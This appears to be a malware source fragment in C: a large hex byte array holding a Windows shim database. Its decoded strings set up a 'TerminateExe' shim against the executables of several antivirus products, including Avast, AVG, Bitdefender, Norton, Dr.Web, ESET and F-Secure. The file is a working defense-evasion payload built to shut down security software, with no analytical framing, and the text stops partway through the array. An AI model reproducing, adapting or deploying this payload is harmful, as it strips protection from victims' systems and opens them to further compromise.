#include "MainHeader.h"
UCHAR sdb_base[] = "\x02\x00\x00\x00\x01\x00\x00\x00\x73\x64\x62\x66\x02\x78\xde\x03\x00\x00\x03\x78\xa0\x01\x00\x00\x02\x38\x07\x70\x03\x38\x01\x60\x16\x40\x01\x00\x00\x00\x01\x98\x8c\x01\x00\x00\x43\x56\x53\x54\x53\x41\x56\x41\x46\x04\x00\x00\x2e\x49\x55\x54\x53\x41\x56\x41\x92\x04\x00\x00\x2e\x43\x56\x53\x57\x46\x56\x41\xde\x04\x00\x00\x2e\x44\x52\x41\x55\x47\x56\x41\x2a\x05\x00\x00\x2e\x43\x4c\x49\x41\x4d\x56\x41\x76\x05\x00\x00\x00\x45\x58\x45\x2e\x50\x56\x41\xc2\x05\x00\x00\x44\x52\x47\x42\x45\x57\x56\x41\x0e\x06\x00\x00\x2e\x54\x4e\x45\x47\x41\x44\x42\x5a\x06\x00\x00\x54\x53\x48\x43\x56\x53\x43\x43\xa6\x06\x00\x00\x45\x4e\x49\x47\x4e\x45\x57\x44\xf2\x06\x00\x00\x4c\x49\x46\x54\x45\x4e\x57\x44\x3e\x07\x00\x00\x43\x49\x56\x52\x45\x53\x57\x44\x8a\x07\x00\x00\x45\x58\x45\x2e\x4e\x52\x4b\x45\xd6\x07\x00\x00\x52\x45\x54\x53\x4f\x48\x53\x46\x22\x08\x00\x00\x58\x45\x2e\x32\x33\x4d\x53\x46\x6e\x08\x00\x00\x45\x2e\x32\x33\x41\x4d\x53\x46\xba\x08\x00\x00\x45\x2e\x50\x53\x52\x4f\x53\x46\x06\x09\x00\x00\x2e\x54\x4e\x45\x47\x41\x43\x4d\x52\x09\x00\x00\x44\x4c\x45\x49\x48\x53\x43\x4d\x9e\x09\x00\x00\x54\x53\x4f\x48\x56\x53\x43\x4d\xea\x09\x00\x00\x2e\x45\x52\x49\x46\x45\x46\x4d\x36\x0a\x00\x00\x2e\x53\x50\x54\x56\x45\x46\x4d\x82\x0a\x00\x00\x45\x2e\x4e\x4f\x4d\x5f\x50\x4f\xce\x0a\x00\x00\x52\x56\x53\x4e\x46\x56\x41\x50\x1a\x0b\x00\x00\x56\x52\x53\x52\x50\x56\x41\x50\x66\x0b\x00\x00\x38\x58\x56\x52\x53\x56\x41\x50\xb2\x0b\x00\x00\x2e\x53\x4c\x52\x54\x43\x53\x50\xfe\x0b\x00\x00\x45\x2e\x54\x53\x4f\x48\x53\x50\x4a\x0c\x00\x00\x2e\x43\x56\x53\x4d\x49\x53\x50\x96\x0c\x00\x00\x45\x2e\x43\x56\x53\x4b\x53\x50\xe2\x0c\x00\x00\x47\x41\x52\x45\x44\x49\x50\x53\x2e\x0d\x00\x00\x45\x2e\x56\x52\x45\x53\x53\x56\x7a\x0d\x00\x00\x45\x2e\x59\x41\x52\x54\x41\x5a\xc6\x0d\x00\x00\x03\x78\x0e\x00\x00\x00\x02\x38\x07\x70\x03\x38\x0b\x60\x01\x98\x00\x00\x00\x00\x03\x78\x0e\x00\x00\x00\x02\x38\x07\x70\x03\x38\x20\x60\x01\x98\x00\x00\x00\x00\x03\x78\x0e\x00\x00\x00\x02\x38\x04\x70\x03\x38\x01\x60\x01\x98\x00\x00\x00\x00\x03\x78\x0e\x00\x00\x00\x02\x38\x0d\x70\x03\x38\x15\x40\x01\x98\x00\x00\x00\x00\x03\x78\x14\x00\x00\x00\x02\x38\x10\x70\x03\x38\x01\x60\x16\x40\x01\x00\x00\x00\x01\x98\x00\x00\x00\x00\x03\x78\x0e\x00\x00\x00\x02\x38\x12\x70\x03\x38\x06\x90\x01\x98\x00\x00\x00\x00\x03\x78\x14\x00\x00\x00\x02\x38\x12\x70\x03\x38\x04\x90\x16\x40\x01\x00\x00\x00\x01\x98\x00\x00\x00\x00\x03\x78\x9a\x01\x00\x00\x02\x38\x07\x70\x03\x38\x04\x90\x01\x98\x8c\x01\x00\x00\xec\x8a\x5f\x68\xf7\xca\xc5\x08\x4a\x0c\x00\x00\x7d\xa1\x65\x78\x56\xf0\x25\x0a\xf2\x06\x00\x00\x7f\xd6\x3e\xbc\x4c\xe1\xd2\x1a\xc2\x05\x00\x00\x40\x44\x18\xc8\xeb\x60\xf4\x22\x1a\x0b\x00\x00\xf7\x8e\x4f\x7a\x55\x13\xa3\x41\xea\x09\x00\x00\x4d\x41\x3d\x2f\x94\xe9\x8a\x45\x76\x05\x00\x00\x56\xd8\xfe\x45\x02\x58\x2d\x4d\x9e\x09\x00\x00\x3b\x77\xe2\x79\x7a\xb9\x3d\x51\xd6\x07\x00\x00\x3f\xaa\x7b\x20\xcf\x77\xbe\x56\x5a\x06\x00\x00\x3d\x55\xb9\x7e\xbe\xbd\x9d\x58\x2e\x0d\x00\x00\x6d\xe1\x45\xce\xfc\x27\x28\x5b\x82\x0a\x00\x00\xe5\xce\x5f\x43\x9d\xd2\x28\x62\x7a\x0d\x00\x00\x30\xf7\x8b\x08\x20\x5f\x9a\x6e\x06\x09\x00\x00\x1c\x51\x06\xb9\xca\x7c\xcd\x70\xc6\x0d\x00\x00\x96\x9d\x2e\x8e\x54\x1a\xec\x7a\xa6\x06\x00\x00\xda\x1c\x17\x3e\x19\xde\x31\x83\xde\x04\x00\x00\x00\x29\x1f\xd4\xcc\xd0\xf2\x83\x8a\x07\x00\x00\x33\xe9\x13\x27\x02\xaf\xbe\x8e\x52\x09\x00\x00\x96\x06\xcd\x14\x68\xaa\xb9\x92\x46\x04\x00\x00\xd8\xb9\x89\xc2\xef\x5a\xb1\xa2\x96\x0c\x00\x00\xdd\x63\xe0\x30\x4b\x6a\xa3\xaf\x36\x0a\x00\x00\x17\xc2\x1c\x73\x2e\xfd\xbe\xb5\xe2\x0c\x00\x00"
				   "\xb7\x42\xab\xcb\x92\x7f\xa0\xbf\xfe\x0b\x00\x00\x53\x7a\xfe\x95\x57\x3f\xcf\xc3\x6e\x08\x00\x00\x6e\xe5\xa8\x77\x59\xd8\xf5\xd1\x22\x08\x00\x00\x42\x91\xa7\x1e\x0f\x52\x85\xdd\x2a\x05\x00\x00\x18\x33\xfe\xae\x14\x8e\x06\xdf\xce\x0a\x00\x00\xec\xe2\x21\x5d\xfc\xcb\xa4\xdf\x66\x0b\x00\x00\xdc\xcf\xd6\x10\x8f\x83\x73\xe2\x3e\x07\x00\x00\xa9\xa6\xe3\x47\xae\xcf\xff\xea\xb2\x0b\x00\x00\x99\x97\xce\xd8\x6a\x12\x37\xfb\x92\x04\x00\x00\xf0\x6f\x19\x43\xf2\xd1\x5c\xfb\xba\x08\x00\x00\xd7\x58\x65\x84\xa4\xbe\xc4\xfc\x0e\x06\x00\x00\x01\x70\x1c\x0a\x00\x00\x01\x50\xf8\x15\xa3\x13\x11\xbf\xce\x01\x22\x60\x06\x00\x00\x00\x01\x60\x1c\x00\x00\x00\x23\x40\x01\x00\x00\x00\x07\x90\x10\x00\x00\x00\x1a\x01\x56\xd6\xa9\xef\x54\x4e\xba\x1d\x91\x0b\x5a\x68\x76\x5c\x02\x70\x00\x00\x00\x00\x0b\x70\x12\x00\x00\x00\x01\x60\x26\x00\x00\x00\x09\x70\x06\x00\x00\x00\x01\x60\x32\x00\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x52\x00\x00\x00\x06\x60\x72\x00\x00\x00\x05\x60\x80\x00\x00\x00\x04\x90\x10\x00\x00\x00\x02\x7a\xe7\xc8\xa7\xaf\x43\x48\x94\x7c\x2a\xdc\xcf\x05\xfa\xda\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x9a\x00\x00\x00\x06\x60\xb8\x00\x00\x00\x05\x60\xc8\x00\x00\x00\x04\x90\x10\x00\x00\x00\x04\xfc\x6a\x03\x3f\xbd\x1e\x4e\x9d\x6b\xa4\xdb\x55\xaf\x29\xb5\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xd8\x00\x00\x00\x06\x60\xf6\x00\x00\x00\x05\x60\x06\x01\x00\x00\x04\x90\x10\x00\x00\x00\x6e\xe0\x17\x13\x53\x6e\xff\x40\xb4\xfc\x00\x2d\x4a\xb0\xce\xc3\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x18\x01\x00\x00\x06\x60\x36\x01\x00\x00\x05\x60\x46\x01\x00\x00\x04\x90\x10\x00\x00\x00\xdb\xfc\xdb\x6e\x2a\x9a\x30\x49\x99\x6d\x7c\x70\x25\xc8\xb5\x94\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x58\x01\x00\x00\x06\x60\x76\x01\x00\x00\x05\x60\x86\x01\x00\x00\x04\x90\x10\x00\x00\x00\xce\xd8\x55\x9d\x57\xa0\x21\x42\x83\x99\x68\xb2\xc3\x49\xab\x07\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x98\x01\x00\x00\x06\x60\xae\x01\x00\x00\x05\x60\xba\x01\x00\x00\x04\x90\x10\x00\x00\x00\xfb\xfe\x54\xa1\x2f\x10\xd3\x43\x84\x28\x6a\x1d\x63\xf1\x01\x59\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xc8\x01\x00\x00\x06\x60\xe8\x01\x00\x00\x05\x60\xf8\x01\x00\x00\x04\x90\x10\x00\x00\x00\x5a\xe4\x8c\x93\xfb\x41\x3c\x4e\x8d\xbc\xe9\x17\x5f\xff\xf8\xb2\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x0a\x02\x00\x00\x06\x60\x28\x02\x00\x00\x05\x60\x38\x02\x00\x00\x04\x90\x10\x00\x00\x00\x9b\x7e\xfd\xc7\xa4\xdd\x96\x44\xa4\xd4\x86\xe7\x6b\xaa\x28\x12\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x4a\x02\x00\x00\x06\x60\x6a\x02\x00\x00\x05\x60\x76\x02\x00\x00\x04\x90\x10\x00\x00\x00\x2d\x67\x94\xe9\xf1\x18\x0d\x44\xbb\xfa\xba\x67\xa5\x02\xe1\x3e\x08\x70\x06\x00"
				   "\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x88\x02\x00\x00\x06\x60\xa8\x02\x00\x00\x05\x60\xb6\x02\x00\x00\x04\x90\x10\x00\x00\x00\xf4\x95\x01\x92\x36\x12\x99\x40\x89\x34\x64\xea\x60\xe2\xbc\x4a\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xc2\x02\x00\x00\x06\x60\xe8\x02\x00\x00\x05\x60\xf6\x02\x00\x00\x04\x90\x10\x00\x00\x00\x5c\xa1\x0f\x19\x9b\xdc\x00\x42\x80\x6e\xd9\x09\x14\x5f\x73\xa0\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x02\x03\x00\x00\x06\x60\x24\x03\x00\x00\x05\x60\x32\x03\x00\x00\x04\x90\x10\x00\x00\x00\xb9\x1a\x89\x86\x69\x9d\x7c\x42\xb9\x33\x96\x52\xa5\x4d\x8e\xc1\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x3e\x03\x00\x00\x06\x60\x56\x03\x00\x00\x05\x60\x62\x03\x00\x00\x04\x90\x10\x00\x00\x00\xb5\xd5\x44\x97\x80\x7f\x6f\x40\x8e\xa2\xa6\xee\xfa\xc6\x52\x11\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x70\x03\x00\x00\x06\x60\x94\x03\x00\x00\x05\x60\xa2\x03\x00\x00\x04\x90\x10\x00\x00\x00\xeb\xbc\xe3\x65\xfd\xe8\xce\x46\x85\x59\x4b\x12\xa4\x30\x3b\x97\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xb2\x03\x00\x00\x06\x60\xcc\x03\x00\x00\x05\x60\xda\x03\x00\x00\x04\x90\x10\x00\x00\x00\xe9\xd4\xc9\x71\xb6\xab\xc1\x4e\xba\xae\x37\xe4\xe1\x94\x0e\x8d\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xea\x03\x00\x00\x06\x60\x06\x04\x00\x00\x05\x60\x14\x04\x00\x00\x04\x90\x10\x00\x00\x00\x72\x50\xa2\x39\xd3\xb8\x4c\x4c\x82\x3f\xbb\x7a\x21\x69\x10\xb7\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x24\x04\x00\x00\x06\x60\x40\x04\x00\x00\x05\x60\x4e\x04\x00\x00\x04\x90\x10\x00\x00\x00\x93\x48\x23\x92\x66\x40\x57\x43\xa3\xbf\xa8\x9a\x46\x1f\xcd\x2d\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x5e\x04\x00\x00\x06\x60\x7c\x04\x00\x00\x05\x60\x88\x04\x00\x00\x04\x90\x10\x00\x00\x00\xb0\x47\x01\x79\x0c\xf4\xcb\x4e\x83\xae\x12\x5e\x0e\x5b\x75\xc0\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x96\x04\x00\x00\x06\x60\xb6\x04\x00\x00\x05\x60\xc2\x04\x00\x00\x04\x90\x10\x00\x00\x00\xfc\x42\x12\x7e\xbe\x06\x4e\x49\xaa\x9a\xec\x3b\xbc\x5e\x63\x04\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xd0\x04\x00\x00\x06\x60\xf0\x04\x00\x00\x05\x60\xfc\x04\x00\x00\x04\x90\x10\x00\x00\x00\x5e\x1f\x54\x95\x9d\x38\xa3\x4b\xa9\x91\x1b\xef\xc8\x2b\x00\x0a\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x0a\x05\x00\x00\x06\x60"
				   "\x28\x05\x00\x00\x05\x60\x34\x05\x00\x00\x04\x90\x10\x00\x00\x00\x65\x72\x14\x30\x78\x76\x65\x49\xb8\x11\xf4\x00\x33\x1c\xc6\xe6\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x42\x05\x00\x00\x06\x60\x60\x05\x00\x00\x05\x60\x6c\x05\x00\x00\x04\x90\x10\x00\x00\x00\xf5\xbd\xf7\xd6\x0f\x2b\x24\x4b\x98\x5c\xb2\x18\xf3\x0c\x0c\x10\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x7a\x05\x00\x00\x06\x60\x96\x05\x00\x00\x05\x60\xa4\x05\x00\x00\x04\x90\x10\x00\x00\x00\x90\x2d\xef\x72\x4b\x10\xbf\x42\x88\x1e\x11\xdc\x5f\x9e\xb9\x9d\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xb4\x05\x00\x00\x06\x60\xd4\x05\x00\x00\x05\x60\xe0\x05\x00\x00\x04\x90\x10\x00\x00\x00\xcc\xf8\xc1\x59\x20\xcf\x05\x4c\x8c\xbc\xd9\x91\xcb\xaf\xf1\x6e\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xee\x05\x00\x00\x06\x60\x0e\x06\x00\x00\x05\x60\x1a\x06\x00\x00\x04\x90\x10\x00\x00\x00\x71\x43\x9a\x1f\x24\xf4\xf8\x44\x9d\xa1\xbb\x42\xd8\x3f\x5c\x9b\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x28\x06\x00\x00\x06\x60\x4a\x06\x00\x00\x05\x60\x56\x06\x00\x00\x04\x90\x10\x00\x00\x00\x25\x7a\xe1\xeb\x8c\x25\x40\x40\x8c\xdc\x02\xac\x22\xea\xbf\xaa\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x64\x06\x00\x00\x06\x60\x82\x06\x00\x00\x05\x60\x8e\x06\x00\x00\x04\x90\x10\x00\x00\x00\x29\xe7\x94\x49\xf4\xc1\x73\x4f\x9e\xa5\x3f\x82\x66\xbe\xd3\xf0\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x9c\x06\x00\x00\x06\x60\xb8\x06\x00\x00\x05\x60\xc4\x06\x00\x00\x04\x90\x10\x00\x00\x00\x4c\x35\x9f\x64\x10\x5b\xd5\x47\xa0\xbf\xc0\x0c\xe7\x91\x10\x4f\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xd2\x06\x00\x00\x06\x60\xf0\x06\x00\x00\x05\x60\xfc\x06\x00\x00\x04\x90\x10\x00\x00\x00\x76\x55\x16\x74\x63\xff\x40\x4b\xae\xec\x9f\xb6\x8c\xa5\xf1\xe9\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x0a\x07\x00\x00\x06\x60\x26\x07\x00\x00\x05\x60\x32\x07\x00\x00\x04\x90\x10\x00\x00\x00\xa6\x75\xcc\xf2\x80\xe1\x7f\x47\xb1\xb7\xd0\x81\xae\x1c\xc1\xf2\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x40\x07\x00\x00\x06\x60\x66\x07\x00\x00\x05\x60\x74\x07\x00\x00\x04\x90\x10\x00\x00\x00\x84\x9c\x2c\x6d\x8b\x7b\xae\x4d\xb9\xc9\x95\x13\x35\xc6\x33\x15\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\x82\x07\x00\x00\x06\x60\x9e\x07\x00\x00\x05\x60\xae\x07\x00\x00\x04\x90\x10\x00\x00\x00\x56\x52\x51\x61\x45\xf9\x12\x41\xb3\x9c\x0e\x22\xd8\x2b\x3a\x23\x08\x70\x06\x00\x00\x00\x01\x60"
				   "\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x07\x70\x46\x00\x00\x00\x01\x60\xc0\x07\x00\x00\x06\x60\xdc\x07\x00\x00\x05\x60\xe8\x07\x00\x00\x04\x90\x10\x00\x00\x00\xbd\x10\x4d\x19\x26\xfc\xe8\x4a\xa1\x41\x4b\xa0\xec\x80\x25\x3a\x08\x70\x06\x00\x00\x00\x01\x60\x90\x00\x00\x00\x0b\x70\x0c\x00\x00\x00\x01\x60\x26\x00\x00\x00\x1a\x40\x2e\x04\x00\x00\x01\x78\xf0\x07\x00\x00\x01\x88\x10\x00\x00\x00\x32\x00\x2e\x00\x31\x00\x2e\x00\x30\x00\x2e\x00\x33\x00\x00\x00\x01\x88\x04\x00\x00\x00\x31\x00\x00\x00\x01\x88\x06\x00\x00\x00\x69\x00\x31\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x54\x00\x65\x00\x72\x00\x6d\x00\x69\x00\x6e\x00\x61\x00\x74\x00\x65\x00\x45\x00\x78\x00\x65\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x41\x00\x76\x00\x61\x00\x73\x00\x74\x00\x53\x00\x76\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x61\x00\x76\x00\x73\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x73\x00\x31\x00\x00\x00\x01\x88\x04\x00\x00\x00\x2a\x00\x00\x00\x01\x88\x18\x00\x00\x00\x41\x00\x76\x00\x61\x00\x73\x00\x74\x00\x55\x00\x49\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x73\x00\x32\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x63\x00\x32\x00\x00\x00\x01\x88\x18\x00\x00\x00\x61\x00\x76\x00\x66\x00\x77\x00\x73\x00\x76\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x69\x00\x32\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x61\x00\x76\x00\x69\x00\x72\x00\x32\x00\x00\x00\x01\x88\x18\x00\x00\x00\x61\x00\x76\x00\x67\x00\x75\x00\x61\x00\x72\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x69\x00\x31\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x61\x00\x76\x00\x69\x00\x72\x00\x31\x00\x00\x00\x01\x88\x18\x00\x00\x00\x61\x00\x76\x00\x6d\x00\x61\x00\x69\x00\x6c\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x69\x00\x33\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x61\x00\x76\x00\x69\x00\x72\x00\x33\x00\x00\x00\x01\x88\x10\x00\x00\x00\x61\x00\x76\x00\x70\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x61\x00\x76\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6a\x00\x65\x00\x6e\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x61\x00\x76\x00\x77\x00\x65\x00\x62\x00\x67\x00\x72\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x61\x00\x76\x00\x69\x00\x34\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x61\x00\x76\x00\x69\x00\x72\x00\x34\x00\x00\x00\x01\x88\x18\x00\x00\x00\x62\x00\x64\x00\x61\x00\x67\x00\x65\x00\x6e\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x62\x00\x69\x00\x74\x00\x31\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x62\x00\x69\x00\x74\x00\x64\x00\x31\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x63\x00\x63\x00\x53\x00\x76\x00\x63\x00\x48\x00\x73\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6e\x00\x31\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x6e\x00\x6f\x00\x72\x00\x74\x00\x31\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x64\x00\x77\x00\x65\x00\x6e\x00\x67\x00\x69\x00\x6e\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x64\x00\x72\x00\x31\x00\x00\x00\x01\x88\x06\x00\x00\x00\x64\x00\x65\x00\x00\x00\x01\x88\x20\x00\x00\x00\x64\x00\x77\x00\x6e\x00\x65\x00\x74\x00\x66\x00\x69\x00\x6c\x00\x74\x00\x65\x00\x72\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x64\x00\x72\x00\x34\x00\x00\x00\x01\x88\x06\x00\x00\x00\x64\x00\x6e\x00\x00\x00\x01\x88\x1c\x00\x00\x00\x64\x00"
				   "\x77\x00\x73\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x64\x00\x72\x00\x32\x00\x00\x00\x01\x88\x06\x00\x00\x00\x64\x00\x73\x00\x00\x00\x01\x88\x12\x00\x00\x00\x65\x00\x6b\x00\x72\x00\x6e\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x65\x00\x73\x00\x00\x00\x01\x88\x08\x00\x00\x00\x65\x00\x73\x00\x31\x00\x00\x00\x01\x88\x1e\x00\x00\x00\x66\x00\x73\x00\x68\x00\x6f\x00\x73\x00\x74\x00\x65\x00\x72\x00\x33\x00\x32\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x66\x00\x73\x00\x31\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x66\x00\x73\x00\x63\x00\x31\x00\x00\x00\x01\x88\x14\x00\x00\x00\x66\x00\x73\x00\x6d\x00\x33\x00\x32\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x66\x00\x73\x00\x33\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x66\x00\x73\x00\x63\x00\x33\x00\x00\x00\x01\x88\x16\x00\x00\x00\x66\x00\x73\x00\x6d\x00\x61\x00\x33\x00\x32\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x66\x00\x73\x00\x34\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x66\x00\x73\x00\x63\x00\x34\x00\x00\x00\x01\x88\x16\x00\x00\x00\x66\x00\x73\x00\x6f\x00\x72\x00\x73\x00\x70\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x66\x00\x73\x00\x32\